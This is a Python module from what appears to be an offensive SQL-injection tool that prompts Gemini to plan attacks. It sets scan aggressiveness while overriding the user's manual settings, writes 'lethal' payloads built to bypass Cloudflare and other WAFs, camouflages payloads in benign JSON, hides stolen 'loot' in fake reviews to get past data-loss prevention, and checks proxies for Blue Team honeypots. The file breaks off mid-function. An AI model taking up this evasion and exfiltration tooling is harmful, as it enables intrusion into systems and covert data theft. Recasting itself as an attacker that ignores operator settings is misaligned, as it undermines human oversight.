"""
Cerberus Cortex AI — Backend Gemini Integration.

Provides real-time tactical intelligence for the scan orchestrator.
Falls back to heuristic logic if Gemini is unavailable or slow (>3s).
"""

import os
import json
import asyncio
import logging
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime, timezone

logger = logging.getLogger("cerberus.core.cortex_ai")

# ---------------------------------------------------------------------------
# SDK initialisation (lazy)
# ---------------------------------------------------------------------------
_client = None


def _get_client():
    global _client
    if _client is not None:
        return _client
    api_key = os.getenv("GEMINI_API_KEY", "")
    if not api_key:
        logger.warning("GEMINI_API_KEY not set — Cortex AI disabled, using heuristics")
        return None
    try:
        from google import genai
        _client = genai.Client(api_key=api_key)
        logger.info("Cortex AI initialised (Gemini backend)")
        return _client
    except Exception as e:
        logger.error(f"Failed to initialise Gemini client: {e}")
        return None


CORTEX_MODEL = "gemini-3-flash-preview"
CORTEX_TIMEOUT = 5.0  # seconds


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class TacticalDecision:
    action: str          # "change_profile", "increase_jitter", "switch_tamper", "skip", "retry"
    params: Dict[str, Any] = field(default_factory=dict)
    reasoning: str = ""
    source: str = "heuristic"  # "gemini" or "heuristic"
    confidence: float = 0.5


@dataclass
class EscalationPlan:
    chains_to_execute: List[str] = field(default_factory=list)
    chains_to_skip: List[str] = field(default_factory=list)
    priority_order: List[str] = field(default_factory=list)
    reasoning: str = ""
    source: str = "heuristic"


@dataclass
class CorrelatedFindings:
    groups: List[Dict[str, Any]] = field(default_factory=list)
    relationships: List[str] = field(default_factory=list)
    reasoning: str = ""
    source: str = "heuristic"


@dataclass
class TacticalSetup:
    level: int = 1
    risk: int = 1
    threads: int = 3
    tamper: str = "space2comment,randomcase"
    delay: int = 0
    technique: str = "BEUSTQ"
    reasoning: str = ""
    source: str = "heuristic"


# ---------------------------------------------------------------------------
# Core AI functions
# ---------------------------------------------------------------------------

async def generate_initial_tactics(target_url: str, mode: str, user_cfg: dict) -> TacticalSetup:
    """
    Given a target and context, the AI decides the optimal initial aggressiveness and evasion.
    Allows Cortex AI to have "sovereignty" over manual configurations (except Tor/Proxy).
    """
    client = _get_client()
    if client is None:
        return _heuristic_initial_tactics(target_url, mode)

    prompt = f"""Eres el planificador táctico de Cerberus Pro.
Determina la configuración de escaneo INICIAL ÓPTIMA para el siguiente objetivo.
Ignora las configuraciones manuales inseguras del usuario; tú tienes SOBERANÍA TÁCTICA.

OBJETIVO:
- URL: {target_url}
- Entorno/Modo: {mode}
- User Config Context (Solo referencia): {json.dumps(user_cfg.get('sqlMap', {}))}

RESPONDE SOLO EN JSON VÁLIDO CON LOS SIGUIENTES CAMPOS:
{{
    "level": (entero 1 al 5. URLs dudosas o complejas = 3+. Standard = 2),
    "risk": (entero 1 al 3. 1 es seguro, 3 puede alterar DB. Usa 1 o 2),
    "threads": (entero 1 al 10. Usa 2-3 para evitar baneos rápidos por IPS),
    "tamper": (string separado por comas, ej. "between,randomcase,space2comment,charencode". Varía según si crees que hay WAF),
    "delay": (entero en segundos, ej 0, 1 o 2. Si sospechas WAF o IPS estricto, pon 2),
    "technique": (letras BEUSTQ. Quita opciones letales si es muy frágil),
    "reasoning": "explicación breve en español sobre por qué escogiste este perfil"
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=CORTEX_TIMEOUT,
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return TacticalSetup(
            level=int(data.get("level", 2)),
            risk=int(data.get("risk", 1)),
            threads=int(data.get("threads", 3)),
            tamper=str(data.get("tamper", "space2comment")),
            delay=int(data.get("delay", 0)),
            technique=str(data.get("technique", "BEUSTQ")),
            reasoning=str(data.get("reasoning", "")),
            source="gemini"
        )
    except Exception as e:
        logger.warning(f"Cortex initial tactics fallback: {e}")
        return _heuristic_initial_tactics(target_url, mode)

def _heuristic_initial_tactics(target_url: str, mode: str) -> TacticalSetup:
    """Fallback if AI is unavailable."""
    setup = TacticalSetup(source="heuristic")
    if "api" in target_url.lower() or mode == "api":
        setup.level = 3
        setup.risk = 1
        setup.tamper = "between,randomcase,base64encode"
        setup.reasoning = "API target detected, increased level and JSON-safe tampers."
    elif ".gov" in target_url.lower() or ".edu" in target_url.lower():
        setup.level = 2
        setup.delay = 3
        setup.threads = 1
        setup.tamper = "apostrophemask,space2comment"
        setup.reasoning = "High-security domain detected, slowing down scan and reducing threads."
    else:
        setup.level = 2
        setup.risk = 1
        setup.threads = 3
        setup.tamper = "space2comment,randomcase"
        setup.reasoning = "Standard heuristic fallback based on target domain."

    return setup

# ---------------------------------------------------------------------------
# AI Response Oracle (Phase 15)
# ---------------------------------------------------------------------------

async def analyze_injection_response(
    baseline_content: str, 
    true_content: str, 
    false_content: str, 
    vector_type: str = "Boolean"
) -> Dict[str, Any]:
    """
    Oráculo Híbrido: Analiza profundamente peticiones ambiguas (Zona Gris) donde las
    matemáticas de difflib fallan por contenido dinámico o barreras proxy.
    Recibe los cuerpos de texto y le pide a Gemini que determine si el diferencial
    responde a inyección SQL o a mero ruido web.
    """
    client = _get_client()
    if client is None:
        logger.warning("AI disabled. Oráculo fallback: Inconclusivo")
        return {"status": "inconclusive", "confidence": 0.0, "reasoning": "AI Unavailable"}

    # Recortar contenidos gigantescos para ahorrar tokens / no colapsar la ventana de contexto
    def snip(text, max_len=2000):
        if not text: return ""
        return text if len(text) < max_len else text[:max_len//2] + "\n...[SNIPPED]...\n" + text[-max_len//2:]

    prompt = f"""Eres el 'Oráculo de Inyecciones' de Cerberus Pro (Fase 15).
Tu trabajo es ser Juez de Última Instancia sobre una petición que la heurística determinó 'Ambiguamente Vulnerable' (Zona Gris).

Tipo de Vector Analizado: {vector_type}

A continuación tienes extractos del cuerpo de la respuesta HTTP. 
1. BASELINE (La página original sin inyección):
```text
{snip(baseline_content)}
```

2. TRUE PAYLOAD (La página cuando inyectamos AND 1=1):
```text
{snip(true_content)}
```

3. FALSE PAYLOAD (La página cuando inyectamos AND 1=2):
```text
{snip(false_content)}
```

Analiza la semántica textual y estructural de las tres respuestas. 
¿La diferencia entre TRUE y FALSE sugiere que el backend en realidad procesó la inyección SQL, o las diferencias son meras fluctuaciones (como IDs de sesión, timestamps o rotación de anuncios)?

RESPONDE SOLO EN JSON VÁLIDO CON LOS SIGUIENTES CAMPOS:
{{
    "status": "vulnerable" | "safe" | "inconclusive",
    "confidence": (float entre 0.0 y 1.0),
    "reasoning": "Tu explicación analítica del diferencial en español, nombrando el fragmento de código que delata el fallo o aclara que es ruido."
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=10.0, # Oráculo tiene tiempo extra por lectura contextual
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return {
            "status": data.get("status", "inconclusive"),
            "confidence": float(data.get("confidence", 0.0)),
            "reasoning": str(data.get("reasoning", "Fallo al decodificar razonamiento AI"))
        }

    except asyncio.TimeoutError:
        logger.warning("Cortex AI Oráculo Timeout (>10s).")
        return {"status": "inconclusive", "confidence": 0.0, "reasoning": "Timeout"}
    except Exception as e:
        logger.error(f"Error procesando oráculo AI: {e}")
        return {"status": "inconclusive", "confidence": 0.0, "reasoning": str(e)}
async def analyze_waf_signal(
    signal_data: Dict[str, Any],
    scan_context: Dict[str, Any],
) -> TacticalDecision:
    """
    Analyse a WAF block/rate-limit signal and return a tactical decision.

    Called by scan_manager when block_rate exceeds threshold.
    """
    client = _get_client()
    if client is None:
        return _heuristic_waf_decision(signal_data, scan_context)

    prompt = f"""Eres el módulo de IA táctica del sistema de pentesting Cerberus.
Estás recibiendo señales de bloqueo de un WAF durante un scan activo.

CONTEXTO DEL SCAN:
- Target: {scan_context.get('target_url', 'unknown')}
- Perfil actual: {scan_context.get('current_profile', 'standard')}
- Block rate: {signal_data.get('block_rate', 0):.0%}
- Latencia promedio: {signal_data.get('avg_latency_ms', 0)}ms
- Captcha detectado: {signal_data.get('captcha_detected', False)}
- Rate limit: {signal_data.get('rate_limited', False)}
- Fase actual: {scan_context.get('current_phase', 'execution')}
- Engines activos: {scan_context.get('engines', [])}

RESPONDE SOLO EN JSON VÁLIDO con esta estructura exacta:
{{
    "action": "change_profile|increase_jitter|switch_tamper|enable_stealth|pause|retry",
    "params": {{"profile": "...", "jitter_multiplier": 1.5, "tamper": "..."}},
    "reasoning": "explicación breve en español",
    "confidence": 0.0-1.0
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL,
                    contents=prompt,
                ),
            ),
            timeout=CORTEX_TIMEOUT,
        )
        text = response.text.strip()
        # Strip markdown code fences if present
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return TacticalDecision(
            action=data.get("action", "retry"),
            params=data.get("params", {}),
            reasoning=data.get("reasoning", ""),
            source="gemini",
            confidence=float(data.get("confidence", 0.7)),
        )
    except asyncio.TimeoutError:
        logger.warning("Cortex AI timeout (>3s) — falling back to heuristic")
        return _heuristic_waf_decision(signal_data, scan_context)
    except Exception as e:
        logger.warning(f"Cortex AI error: {e} — falling back to heuristic")
        return _heuristic_waf_decision(signal_data, scan_context)


async def suggest_escalation(
    findings: List[Dict[str, Any]],
    coverage_summary: Dict[str, Any],
) -> EscalationPlan:
    """
    Given current findings and coverage, suggest which escalation chains to prioritise.
    """
    client = _get_client()
    if client is None or not findings:
        return _heuristic_escalation(findings, coverage_summary)

    findings_summary = json.dumps(findings[:10], default=str, indent=2)

    prompt = f"""Eres el módulo de IA táctica de Cerberus.
Analiza los hallazgos de un scan de vulnerabilidades y recomienda la estrategia de escalación.

HALLAZGOS ACTUALES:
{findings_summary}

COBERTURA:
- Coverage: {coverage_summary.get('coverage_percentage', 0):.0f}%
- Engines ejecutados: {coverage_summary.get('engines_executed', [])}
- Bloqueadores: {coverage_summary.get('blockers', [])}

RESPONDE SOLO EN JSON VÁLIDO:
{{
    "chains_to_execute": ["data_exfil", "rce", "auth_bypass"],
    "chains_to_skip": ["lateral_movement"],
    "priority_order": ["rce", "data_exfil"],
    "reasoning": "explicación breve en español"
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=CORTEX_TIMEOUT,
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return EscalationPlan(
            chains_to_execute=data.get("chains_to_execute", []),
            chains_to_skip=data.get("chains_to_skip", []),
            priority_order=data.get("priority_order", []),
            reasoning=data.get("reasoning", ""),
            source="gemini",
        )
    except (asyncio.TimeoutError, Exception) as e:
        logger.warning(f"Cortex escalation fallback: {e}")
        return _heuristic_escalation(findings, coverage_summary)


async def correlate_findings_ai(
    findings: List[Dict[str, Any]],
) -> CorrelatedFindings:
    """
    Use AI to find non-obvious relationships between findings.
    """
    client = _get_client()
    if client is None or len(findings) < 2:
        return _heuristic_correlation(findings)

    findings_text = json.dumps(findings[:15], default=str, indent=2)

    prompt = f"""Eres el módulo de correlación inteligente de Cerberus.
Analiza estos hallazgos de pentesting y encuentra relaciones no-obvias.

HALLAZGOS:
{findings_text}

RESPONDE SOLO EN JSON VÁLIDO:
{{
    "groups": [
        {{"id": "group1", "finding_indices": [0, 2], "relationship": "SQLi + RCE chain"}},
    ],
    "relationships": [
        "El SQLi en /admin permite enumerar credenciales que habilitan el RCE en /exec"
    ],
    "reasoning": "explicación"
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=CORTEX_TIMEOUT,
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return CorrelatedFindings(
            groups=data.get("groups", []),
            relationships=data.get("relationships", []),
            reasoning=data.get("reasoning", ""),
            source="gemini",
        )
    except (asyncio.TimeoutError, Exception) as e:
        logger.warning(f"Cortex correlation fallback: {e}")
        return _heuristic_correlation(findings)


async def generate_forensic_narrative(
    verdict_status: str,
    findings: List[Dict[str, Any]],
    coverage_pct: float,
) -> str:
    """
    Generate a professional forensic narrative for the report.
    """
    client = _get_client()
    if client is None:
        return _heuristic_narrative(verdict_status, findings, coverage_pct)

    prompt = f"""Genera un resumen ejecutivo forense EN ESPAÑOL para un reporte de pentesting.

VEREDICTO: {verdict_status}
HALLAZGOS: {len(findings)}
COBERTURA: {coverage_pct:.0f}%
DETALLES: {json.dumps(findings[:5], default=str)}

El resumen debe ser:
- Profesional y técnico
- 3-5 párrafos
- Incluir recomendaciones de remediación
- Tono de ciberseguridad forense"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=5.0,  # Longer timeout for narrative
        )
        return response.text
    except Exception as e:
        logger.warning(f"Cortex narrative fallback: {e}")
        return _heuristic_narrative(verdict_status, findings, coverage_pct)

async def generate_smart_payloads(
    context: Dict[str, Any],
    error_trace: str,
    target_count: int = 5
) -> List[str]:
    """
    Generate context-aware, polyglot payloads by analyzing error traces and backend responses.
    """
    client = _get_client()
    if client is None:
        return []

    prompt = f"""Eres un Ingeniero Inverso de Exploits y Pentester Experto operando dentro del motor Cerberus.
Tu objetivo es analizar un error del servidor o un contexto y generar payloads SQLi políglotas exactos, capaces de burlar el parser específico del backend.

CONTEXTO DEL SISTEMA RECOLECTADO:
- Vector/Tipo: {context.get('vector', 'Desconocido')}
- URL/Endpoint: {context.get('url', 'Desconocido')}
- Parámetro Target: {context.get('parameter', 'Desconocido')}
- DB Detectada: {context.get('dbms', 'Auto')}
- Plataforma/OS Detectado: {context.get('os', 'Auto')}

TRACE DE ERROR DEL RESPONSABLE (MÁS IMPORTANTE):
{error_trace[:2000] if error_trace else "No error trace available. Use context to guess."}

INSTRUCCIONES:
1. Analiza qué lenguaje, ORM o base de datos generó el error (ej. Hibernate, MySQL, Python traceback).
2. Genera exactamente {target_count} payloads altamente específicos diseñados para explotar este entorno. Usa comentarios `/**/`, variables anidadas o técnicas avanzadas según el error.
3. No des explicaciones, devuelve únicamente un JSON válido con la siguiente estructura estricta:

{{
    "payloads": ["payload1", "payload2", "payload3"]
}}"""

    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=CORTEX_TIMEOUT * 1.5,  # Slightly longer timeout for complex payload generation
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        data = json.loads(text)
        return data.get("payloads", [])
    except Exception as e:
        logger.warning(f"Cortex smart payload generation failed: {e}")
        return []

async def generate_semantic_camouflage(
    raw_payload: str,
    endpoint_context: Dict[str, Any],
    format_type: str = "json"
) -> Optional[str]:
    """
    [P5-B] Generates a benign-looking business structure (e.g. JSON) that stealthily embeds 
    the malicious payload, evading traditional signature-based WAFs via behavioral mimicry.
    """
    client = _get_client()
    if client is None:
        return None

    prompt = f"""Eres una IA Especialista en Evasión Semántica y Red Teaming avanzado.
Tu objetivo es camuflar un payload SQLi agresivo dentro de una estructura de datos aparentemente inofensiva y legítima, para burlar firewalls aplicativos (WAFs) basados en firmas heurísticas que ignoran valores dentro de grandes conjuntos JSON.

PAYLOAD A ESCONDER:
{raw_payload}

CONTEXTO DEL OBJETIVO:
- Target Endpoint: {endpoint_context.get('url', 'Desconocido')}
- Método Habitual: POST/PUT
- Parámetro Objetivo (donde debería ejecutar el SQLi): {endpoint_context.get('parameter', 'id')}

INSTRUCCIONES:
1. Diseña un documento {format_type.upper()} que simule ser válido y habitual para un entorno de negocio moderno (ej. un registro de usuario complejo, configuración de perfil, logging, etc.).
2. El documento debe contener al menos 4-5 campos legítimos como 'email', 'status', 'preferences', 'user_agent' o similares.
3. Inyecta el PAYLOAD A ESCONDER de forma EXACTA e INTACTA (no escapes las comillas del payload) dentro de uno de los valores del JSON, preferiblemente en un campo que parezca de texto largo, pero asócialo lógicamente a la key indicada en el Parámetro Objetivo si tiene sentido.
4. Tu respuesta final debe ser EXCLUSIVAMENTE el string {format_type.upper()} validado y parseable. Sin explicaciones ni delimitadores markdown.

Ejemplo de salida de éxito esperada:
{{
  "user_email": "admin@empresa.com",
  "preferences": {{ "theme": "dark", "notifications": true }},
  "{endpoint_context.get('parameter', 'id')}": "{raw_payload}",
  "session_token": "a1b2c3d4e5f6g7h8i9j0"
}}
"""
    try:
        response = await asyncio.wait_for(
            asyncio.get_event_loop().run_in_executor(
                None,
                lambda: client.models.generate_content(
                    model=CORTEX_MODEL, contents=prompt
                ),
            ),
            timeout=CORTEX_TIMEOUT * 1.5,
        )
        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
            if text.endswith("```"):
                text = text[:-3]
            text = text.strip()

        # Validate it is parseable JSON
        json.loads(text)
        return text
    except Exception as e:
        logger.warning(f"Cortex semantic camouflage generation failed: {e}")
        return None



# ---------------------------------------------------------------------------
# Structured Finding Parser
# ---------------------------------------------------------------------------

def parse_structured_findings(findings: list[dict]) -> list[dict]:
    """
    Parse raw findings into structured fields:
    - db_name, db_user, tables, os_info extracted from evidence
    - severity_score normalized to CVSS-like 0-10 scale
    - remediation suggestion per finding type
    """
    import re

    SEVERITY_MAP = {
        "critical": 9.5, "high": 8.0, "medium": 5.5, "low": 3.0, "info": 1.0
    }
    REMEDIATION = {
        "sql_injection": "Usar consultas parametrizadas (prepared statements). Validar y sanitizar inputs.",
        "rce": "Deshabilitar funciones peligrosas (exec, system). Aplicar sandboxing.",
        "xss": "Escapar output HTML. Implementar Content-Security-Policy.",
        "command_injection": "Evitar shell commands. Usar APIs seguras del lenguaje.",
        "lfi": "No usar input del usuario en rutas de archivos. Whitelist de paths permitidos.",
        "auth_bypass": "Implementar autenticación robusta. Revisar lógica de sesiones.",
    }

    structured = []
    for f in findings:
        sf = f.copy()
        evidence_text = " ".join(f.get("evidence", [])) if isinstance(f.get("evidence"), list) else str(f.get("evidence", ""))
        
        # Extract DB info from evidence
        db_match = re.search(r"database[:\s]+['\"]?(\w+)", evidence_text, re.I)
        user_match = re.search(r"(?:current\s+)?user[:\s]+['\"]?(\S+)", evidence_text, re.I)
        table_matches = re.findall(r"(?:table|tabla)[:\s]+['\"]?(\w+)", evidence_text, re.I)
        os_match = re.search(r"(?:os|sistema)[:\s]+['\"]?([^\n'\"]+)", evidence_text, re.I)
        version_match = re.search(r"version[:\s]+['\"]?([^\n'\"]+)", evidence_text, re.I)

        sf["structured"] = {
            "db_name": db_match.group(1) if db_match else None,
            "db_user": user_match.group(1) if user_match else None,
            "tables_found": table_matches or [],
            "os_info": os_match.group(1).strip() if os_match else None,
            "db_version": version_match.group(1).strip() if version_match else None,
        }

        # Normalize severity
        raw_sev = str(f.get("severity", "medium")).lower()
        sf["severity_score"] = SEVERITY_MAP.get(raw_sev, 5.5)
        
        # Add remediation
        ftype = str(f.get("type", "")).lower()
        sf["remediation"] = REMEDIATION.get(ftype, "Revisar manualmente y aplicar controles de seguridad.")

        structured.append(sf)

    return structured


# ---------------------------------------------------------------------------
# Heuristic fallbacks
# ---------------------------------------------------------------------------

def _heuristic_waf_decision(
    signal: Dict[str, Any], ctx: Dict[str, Any]
) -> TacticalDecision:
    block_rate = signal.get("block_rate", 0)
    captcha = signal.get("captcha_detected", False)
    rate_limited = signal.get("rate_limited", False)

    if captcha:
        return TacticalDecision(
            action="enable_stealth",
            params={"use_browser_stealth": True, "jitter_multiplier": 2.0},
            reasoning="Captcha detectado — activar BrowserStealth para bypass",
            confidence=0.8,
        )
    if rate_limited:
        return TacticalDecision(
            action="increase_jitter",
            params={"jitter_multiplier": 2.5, "threads": 1},
            reasoning="Rate limit activo — reducir velocidad drásticamente",
            confidence=0.9,
        )
    if block_rate > 0.5:
        return TacticalDecision(
            action="change_profile",
            params={"profile": "stealth", "tamper": "between,randomcase,space2comment"},
            reasoning=f"Block rate alto ({block_rate:.0%}) — cambiar a perfil sigiloso",
            confidence=0.7,
        )
    if block_rate > 0.2:
        return TacticalDecision(
            action="switch_tamper",
            params={"tamper": "randomcase,space2comment"},
            reasoning=f"Block rate moderado ({block_rate:.0%}) — rotar tampers",
            confidence=0.6,
        )
    return TacticalDecision(
        action="retry",
        params={},
        reasoning="Señales normales — continuar",
        confidence=0.5,
    )


def _heuristic_escalation(
    findings: List[Dict], coverage: Dict
) -> EscalationPlan:
    chains = []
    for f in findings:
        ftype = f.get("type", "")
        if ftype in ("sql_injection", "rce"):
            chains.append("data_exfil")
        if ftype == "rce":
            chains.append("rce")

    return EscalationPlan(
        chains_to_execute=list(set(chains)) or ["data_exfil"],
        chains_to_skip=[],
        priority_order=chains[:3],
        reasoning="Escalación heurística basada en tipos de findings",
    )


def _heuristic_correlation(findings: List[Dict]) -> CorrelatedFindings:
    groups = []
    by_endpoint = {}
    for i, f in enumerate(findings):
        ep = f.get("endpoint", "unknown")
        by_endpoint.setdefault(ep, []).append(i)

    for ep, indices in by_endpoint.items():
        if len(indices) >= 2:
            groups.append({
                "id": f"ep_{ep}",
                "finding_indices": indices,
                "relationship": f"Multiple findings on {ep}",
            })

    return CorrelatedFindings(
        groups=groups,
        relationships=[],
        reasoning="Correlación por endpoint (heurística)",
    )


def _heuristic_narrative(
    verdict: str, findings: List[Dict], coverage: float
) -> str:
    n = len(findings)
    if verdict == "VULNERABLE":
        return (
            f"## Resumen Ejecutivo\n\n"
            f"Se identificaron **{n} hallazgo(s)** confirmado(s) con una cobertura del {coverage:.0f}%. "
            f"El sistema objetivo presenta vulnerabilidades que requieren remediación inmediata.\n\n"
            f"**Recomendación**: Parchear las vulnerabilidades identificadas y realizar un re-test."
        )
    if verdict == "NO_VULNERABLE":
        return (
            f"## Resumen Ejecutivo\n\n"
            f"No se identificaron vulnerabilidades con una cobertura del {coverage:.0f}%. "
            f"El sistema objetivo no presenta vectores de ataque explotables con las técnicas empleadas.\n\n"
            f"**Recomendación**: Mantener monitoreo y repetir auditoría periódicamente."
        )
    return (
        f"## Resumen Ejecutivo\n\n"
        f"El análisis fue **inconcluso** (cobertura: {coverage:.0f}%). "
        f"No se pudo determinar con certeza el estado de seguridad del objetivo. "
        f"Existen bloqueadores que impidieron completar la evaluación.\n\n"
        f"**Recomendación**: Resolver bloqueadores y re-ejecutar con cobertura completa."
    )


async def hide_in_plain_sight(loot: str, theme: str = "customer_review") -> Optional[str]:
    """
    [P5-C Data Steganography]
    Uses Generative AI to hide extracted data inside innocent-looking text.
    """
    client = _get_client()
    if client is None:
        logger.warning("Cortex AI not available for Steganography.")
        return None
        
    prompt = f"""Eres el módulo de Esteganografía Generativa del sistema Cerberus.
Tu objetivo es ocultar información de forma que pase desapercibida ante herramientas DLP (Data Loss Prevention) y firewalls.

TEMA REQUERIDO: Escribe un texto coherente y legítimo sobre: {theme} (ej. una reseña de producto, un ticket de soporte, un email corporativo).

LOOT A OCULTAR (Cadena en JSON/Base64):
{loot}

Instrucciones de incrustación:
Puedes inyectar esta cadena literal dentro de un campo como "Tracking ID", "Diagnostic Data", "Session Token" o cualquier patrón que encaje naturalmente con el {theme}.
Asegúrate de que la cadena se inserte INTACTA para facilitar su extracción mediante expresiones regulares.

Restricciones:
- No menciones que estás ocultando algo.
- El texto debe parecer 100% natural, escrito por un humano.
- Devuelve SOLAMENTE el texto generado con la información oculta. No agregues explicaciones."""

    try:
        response = await asyncio.to_thread(
            client.models.generate_content,
            model=CORTEX_MODEL,
            contents=prompt,
        )
        return response.text.strip()
    except Exception as e:
        logger.error(f"Cortex steganography generation failed: {e}")
        return None

async def evaluate_node_safety(node_url: str, latency_history: list, block_rate: float) -> dict:
    """
    [P5-D Active Threat Intel]
    Uses Generative AI to evaluate if a proxy/Tor node is likely a honeypot or tarpit.
    Returns JSON with {"is_safe": bool, "confidence": float, "reasoning": str}
    """
    client = _get_client()
    if client is None:
        logger.warning(f"Cortex AI not available. Heuristically marking node {node_url} as safe.")
        return {"is_safe": True, "confidence": 0.5, "reasoning": "Heurística pasiva (IA inactiva)"}
        
    prompt = f"""Eres el Analista de Ciberinteligencia de Amenazas Activas de Cerberus.
Tu objetivo es analizar telemetría de red y determinar si un nodo proxy/Tor es un Honeypot del Blue Team, un Tarpit diseñado para gastar nuestros recursos, o un nodo de salida legítimo.

DATOS DEL NODO:
- URL del Nodo: {node_url}
- Historial de Latencias (últimos pings en ms): {latency_history}
- Tasa de Bloqueos (Block Rate): {block_rate:.0%}

Reglas Heurísticas sugeridas:
1. Una latencia que oscila matemáticamente de forma perfecta sugiere un Tarpit sintético.
2. Un ratio de bloqueos del 100% permanente con tiempos de respuesta anómalamente bajos sugiere redirección a sumidero DNS.
3. Latencias erráticas o altas pero orgánicas suelen indicar un proxy público saturado legítimo.

Requisitos de Salida:
Devuelve EXCLUSIVAMENTE un bloque JSON válido con el siguiente esquema:
{{
    "is_safe": boolean,
    "confidence": float (0.0 a 1.0),
    "reasoning": "Descripción técnica concisa del por qué de la decisión"
}}
NO agregues markdown genérico de bloque de código, devuelve sólo el string JSON puro."""

    try:
        response = await asyncio.to_thread(
            client.models.generate_content,
            model=CORTEX_MODEL,
            contents=prompt,
        )
        # Parse the JSON response
        text = response.text.replace('```json', '').replace('```', '').strip()
        data = json.loads(text)
        return {
            "is_safe": bool(data.get("is_safe", True)),
            "confidence": float(data.get("confidence", 0.5)),
            "reasoning": str(data.get("reasoning", "No valid reasoning provided."))
        }
    except Exception as e:
        logger.error(f"Cortex threat intel evaluation failed for node {node_url}: {e}")
async def generate_lethal_payload(
    target_url: str,
    tech_stack: Dict[str, str],
    error_feedback: Optional[str] = None,
    waf_signals: List[str] = None,
    risk_level: int = 1
) -> Dict[str, Any]:
    """
    [P5-E Lethal Payload Generation - V2 Predatory]
    Uses Gemini 3 to create context-aware, predatory SQL injection payloads.
    Directly incorporates OOB (Out-of-Band) and advanced WAF bypass techniques.
    """
    client = _get_client()
    if client is None:
        return {
            "payload": "' OR 1=1 --",
            "reasoning": "Heurística básica (IA inactiva)",
            "confidence": 0.1,
            "is_lethal": False
        }

    prompt = f"""Eres el Maestro de Armas Ofensivo de Cerberus (Nivel 5).
Tu objetivo es generar una carga útil (PAYLOAD) letal, quirúrgica y contextualmente perfecta.

DATOS DEL OBJETIVO:
- URL: {target_url}
- Stack Tecnológico: {json.dumps(tech_stack)}
- Feedback de Errores: {error_feedback or "Ciego (Sin errores directos)"}
- Señales de WAF detectadas: {", ".join(waf_signals or ["Ninguna"])}
- Nivel de Riesgo (1-3): {risk_level}

DIRECTIVAS DE LETALIDAD Y EVASIÓN AVANZADA (Cloudflare/IPS):
1. **Dialecto Específico**: Si el stack es PHP/MySQL, usa `HEX()`, `UNHEX()`, y `ELT()` para fragmentar datos. No uses `LOAD_FILE` si Cloudflare detecta rutas UNC/Windows.
2. **Bypass de Firmas L7**:
   - Evita palabras clave como `UNION`, `SELECT`, `WHERE`. Sustitúyelas por variaciones de caja (`uNiOn`), caracteres nulos (`%00`), o comentarios en línea (`/*!50000SELECT*/`).
   - Usa sustitutos lógicos: `INSTR('abc','a')` en lugar de `LIKE`, o `ABS(1)` para comparaciones booleanas.
3. **Ofuscación de Tráfico**: Cloudflare analiza la estructura del payload. Usa caracteres de control (`%09`, `%0a`, `%0d`) y espacios alternativos (`%A0`, `/**/`) para romper la detección basada en RegEx.
4. **Behavioral Masking**: Si se detecta Cloudflare, genera payloads que parezcan peticiones legítimas (ej: parámetros de búsqueda complejos o JSON strings).
5. **Predación Sigilosa**: Prefiere técnicas de error-based ciegas o de tiempo con jitter, ya que las UNION son muy ruidosas para Cloudflare.

REGLAS DE RESPUESTA:
- Devuelve EXCLUSIVAMENTE un bloque JSON puro.
- NO incluyas introducciones ni explicaciones fuera del JSON.
- Asegúrate de que el JSON sea válido.

ESQUEMA JSON:
{{
    "payload": "la cadena de inyección exacta para bypass",
    "reasoning": "táctica específica para burlar el WAF detectado",
    "confidence": float (0.0 a 1.0),
    "is_lethal": boolean
}}"""

    try:
        response = await asyncio.to_thread(
            client.models.generate_content,
            model=CORTEX_MODEL,
            contents=prompt,
        )
        
        # Robust JSON extraction
        raw_text = response.text.strip()
        # Find first '{' and last '}'
        start = raw_text.find('{')
        end = raw_text.rfind('}')
        if start != -1 and end != -1:
            raw_text = raw_text[start:end+1]
        
        data = json.loads(raw_text)
        return {
            "payload": str(data.get("payload", "' OR 1=1 --")),
            "reasoning": str(data.get("reasoning", "Cortex AI Lethal Engine.")),
            "confidence": float(data.get("confidence", 0.5)),
            "is_lethal": bool(data.get("is_lethal", False))
        }
    except Exception as e:
